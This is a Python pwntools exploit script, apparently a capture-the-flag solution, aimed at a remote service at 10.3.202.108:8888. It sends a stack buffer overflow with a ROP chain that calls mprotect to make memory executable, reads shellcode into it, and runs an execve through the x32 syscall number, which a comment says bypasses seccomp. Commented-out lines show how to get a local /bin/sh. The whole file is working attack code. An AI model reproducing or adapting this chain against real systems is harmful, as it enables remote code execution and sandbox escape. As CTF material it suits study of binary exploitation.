#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

#r = process('./fuck')
r = remote('10.3.202.108', 8888)

pad = 'a'*72

bss = 0x006cc000
pop_rdi_ret = 0x00000000004017c6
pop_rsi_ret = 0x00000000004018e7
pop_rdx_ret = 0x0000000000442e16
pop_rax_ret = 0x000000000041f964
dec_ecx_ret = 0x000000000047a9fd
mprotect = 0x4404d0

libc_read = 0x43f980

syscall = 0x00000000004003da
main = 0x00000000004009ae
get = 0x40fe60

rop = flat(
    pop_rdi_ret, bss, pop_rsi_ret, 0x1000, pop_rdx_ret, 7, mprotect,
    pop_rdi_ret, 0, pop_rsi_ret, bss, pop_rdx_ret, 0x300, libc_read, main
)

# 0x4000003b -> for bypass seccomp
code = asm('''
    mov rax, 0x4000003b
    mov rdi, 0x006cc200
    mov rdx, 0
    mov rsi, 0
    syscall
''')

r.recvuntil('Input:')
raw_input('#')
r.sendline(pad + rop)

raw_input('#')
#r.send(code.ljust(0x200, '\x00') + '/bin/sh\x00') # for local enviroment
r.send(code.ljust(0x200, '\x00') + '/home/golden/flag.exe\x00') # for challenge enviroment

leave_retf = 0x00000000004a0733
push_rbp_ret = 0x00000000004c6e66
raw_input('#')
r.sendline('a'*(72-8) + p64(bss) + p64(push_rbp_ret))

# CSC{GiveMeTheFMoney}
r.interactive()
